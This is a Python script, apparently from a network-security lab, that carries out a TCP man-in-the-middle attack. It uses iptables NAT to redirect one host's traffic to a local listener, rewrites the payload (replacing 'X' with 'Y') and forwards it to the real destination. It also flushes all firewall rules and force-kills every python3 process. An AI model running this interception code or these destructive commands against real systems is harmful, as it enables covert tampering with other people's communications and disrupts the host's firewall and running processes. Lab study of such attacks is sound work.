import socket, os , time, signal, atexit, sys
from scapy.all import *

def cleanup():
    """Cleanup logic for exit"""
    print("Cleaning up resources...")
    os.system("iptables -D INPUT -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")
    os.system("iptables -D FORWARD -s 10.9.0.5 -p tcp --dport 9090 -j DROP 2>/dev/null")

def signal_handler(sig, frame):
    """Signal Handler for graceful exit"""
    print("Interrupt received. Exiting gracefully...")
    sys.exit(0)

def setup_iptables():
    """Setup logic for IPtables"""
    print("Setting up iptables rules...")
    os.system("iptables -F")  # Flush all existing rules
    os.system("killall -9 python3 2>/dev/null")  # Kill any other Python scripts that might be using the port
    time.sleep(1)  # Give system time to release resources
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enable IP forwarding
    os.system("iptables -t nat -A PREROUTING -s 10.9.0.5 -d 10.9.0.6 -p tcp --dport 9090 -j REDIRECT --to-port 9091") # Add a NAT rule to redirect packet from HostA destined to HostB on port 9090 to 9091
    print("Iptables setup complete")


def receive_and_modify():
    """Receive & Modify Packet"""
    # Create a socket to listen for redirected traffic
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 9091))
    sock.listen(5)
    print("Listening for redirected traffic on port 9091...")
    
    while True:
        client_sock, addr = sock.accept()
        print(f"\nConnection from {addr}")
        
        # Read data from the connection
        data = client_sock.recv(4096)
        if not data:
            client_sock.close()
            continue
        
        try:
            # Decode and modify the payload
            payload = data.decode(errors='ignore').strip()
            print(f"Intercepted: {payload}")
            
            ### MITM MODIFICATION ###
            # Replace X with Y if present
            if 'X' in payload:
                modified_payload = payload.replace('X', 'Y')
                modified_data = (modified_payload + '\n').encode()
                print(f"Modified: X → Y")
                print(f"Forwarding to HostB: {modified_payload}")
            else:
                modified_data = data
                modified_payload = payload
                print("No modification needed (no X found)")
                print(f"Forwarding to HostB: {modified_payload}")
            
            # Forward modified data to the actual destination
            forward_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            forward_sock.connect(('10.9.0.6', 9090))
            forward_sock.send(modified_data)
            print(f"Payload sent to HostB")
            
            # Clean up
            forward_sock.close()
            client_sock.close()
            
        except Exception as e:
            print(f"Error processing connection: {e}\n")
            client_sock.close()

def main():
    """Main function to run the MITM attack"""
    print("Starting real-time TCP MITM with raw sockets and iptables...")
    
    # Register cleanup and signal handlers
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Set up iptables
    setup_iptables()
    
    try:
        # Start listening and forwarding
        receive_and_modify()
    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        # Clean up iptables rules
        os.system("iptables -F")
        os.system("iptables -t nat -F")
        print("Cleaned up iptables rules")

if __name__ == "__main__":
    main()
